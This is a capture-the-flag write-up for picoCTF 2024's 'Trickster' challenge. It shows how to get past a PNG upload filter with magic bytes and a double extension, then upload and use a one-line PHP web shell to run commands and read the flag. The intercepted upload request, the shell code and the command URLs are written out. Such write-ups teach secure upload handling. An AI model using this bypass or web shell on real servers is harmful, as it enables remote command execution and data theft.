# picoCTF2024 Trickster Write Up

## Description

> I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:55965/)!

## Solution

First I tried uploading a PNG file with regular text data. This resulted in the following message from the server:

> Error: The file is not a valid PNG image: 68656c6c

To compare this with the expected behaviour on successful file upload, I uploaded a regular PNG image. This produced the following message:

> File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully

At this point I knew I needed to more work to bypass whatever file upload restrictions were in place. Before continuing, I checked `robots.txt` which had the following contents:

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

Checking out `instructions.txt` revealed the following details about the upload process:

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

This reveals some information about how the server is verifying that the uploaded file is in fact a PNG file. It first checks for the `.png` extension, and then checks that the magic bytes match. The magic bytes are a sequence of bytes often used at the beginning of a file to indicate the file type. In the case of PNG files, this is literally the ascii codes for the characters P, N and G.

The `uploads` directory was not accessible, although from context is the directory in which uploaded files are stored.

This is enough information to subvert the PNG restriction on the file upload system. First I created a file called `malicious.png` containing the following text contents:

```
PNG
I uploaded a text file!
```

The `PNG` string at the top of the file ensures that the magic bytes are set to the correct value and setting the file name to have the `.png` bypasses the first check. 

Uploading this file results in a successful upload! There is a problem however - when I attempted to access the file by sending a POST request to `/uploads/malicious.png` we get the following message:

> The image “http://atlas.picoctf.net:56700/uploads/malicious.png” cannot be displayed because it contains errors.

Since the request is asking for a `.png` file, the server is attempting to send the file back as an image. However, the file does not contain image data - it contains character data.

I needed a way to include both the `.png` file extension and a `.txt` extension so that the file upload is successful, but upon retrieval the file is treated as a regular text file. A common way of doing this is by naming the file `malicious.png.txt`. This can often work, because misconfigured PNG extension validation often checks for the extensions presence anywhere in the file path.

My browser would not allow me to upload a file that doesn't end in `.png` directly, so I used Burpsuite to intercept the request and modify the file name. For instance, the POST request for `malicious.png` looks like:

```http
POST / HTTP/1.1
Host: atlas.picoctf.net:56700
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------34041064133888725822962506192
Content-Length: 250
Origin: http://atlas.picoctf.net:56700
Connection: close
Referer: http://atlas.picoctf.net:56700/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------34041064133888725822962506192
Content-Disposition: form-data; name="file"; filename="malicious.png"
Content-Type: image/png

PNG
I uploaded a text file!

-----------------------------34041064133888725822962506192--
```

After intercepting this request I changed the `filename` parameter in the `Content-Disposition` header to `malicious.png.txt` which I then forwarded to the server.

The upload works successfully, and accessing `/uploads/malicious.png.txt` produces the contents:

```
PNG
I uploaded a text file!
```

Indicating that the file is being accessed as a text file. 

At this stage we have passed the first major hurdle - uploading a file with contents of our choosing. With a file upload vulnerability there are many potential avenues to try. However, the challenge tags include `browser_webshell_solvable`, meaning that this is a good first thing to try.

[Wikipedia](https://en.wikipedia.org/wiki/Web_shell) defines a webshell as:

> a [shell-like interface](https://en.wikipedia.org/wiki/Shell_(computing) "Shell (computing)") that enables a [web server](https://en.wikipedia.org/wiki/Web_server "Web server") to be remotely accessed, often for the purposes of [cyberattacks](https://en.wikipedia.org/wiki/Cyberattack "Cyberattack"). A web shell is unique in that a [web browser](https://en.wikipedia.org/wiki/Web_browser "Web browser") is used to interact with it.

The Wikipedia article also contains a simple example of a PHP web shell:

```php
<?=`$_GET[x]`?>
```

The above PHP code executes a shell command on the server passed through a query parameter `x`. For instance, if a PHP file `malicious.php` containing the above contents is uploaded to `www.mywebsite.com/uploads` then navigating to `www.mywebsite.com/uploads/malicious.php?x=ls` should produce the results of running the `ls` command in the `uploads` directory on the server.

To test this I modified the contents of `malicious.png` to contain:

```php
PNG
<?=`$_GET[x]`?>
```

I then uploaded this file using the steps described above, swapping out the `.txt` extension to `.php`. I then tested out the `ls` command using the following query:

```
http://atlas.picoctf.net:50746/uploads/malicious.png.php?x=ls
```

Note: since a challenge instance is used, swap out `http://atlas.picoctf.net:50746` for your own challenge domain.

This resulted in the following contents being outputted:

```
PNG malicious.png malicious.png.php malicious.png.txt
```

These are the files in the `uploads` directory i.e. the web shell works. Inspecting the directory above (i.e. the web root) requires the following query:

```
http://atlas.picoctf.net:50746/uploads/malicious.png.php?x=ls%20..
```

Which executes the command `ls ..` on the server. This produces the following contents:

```
PNG GAZWIMLEGU2DQ.txt index.php instructions.txt robots.txt uploads
```

The file `GAZWIMLEGU2DQ.txt` seems interesting - to access it we can run the query:

```
http://atlas.picoctf.net:50746/uploads/malicious.png.php?x=cat%20..%2FGAZWIMLEGU2DQ.txt
```

This produces the flag:

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}
```

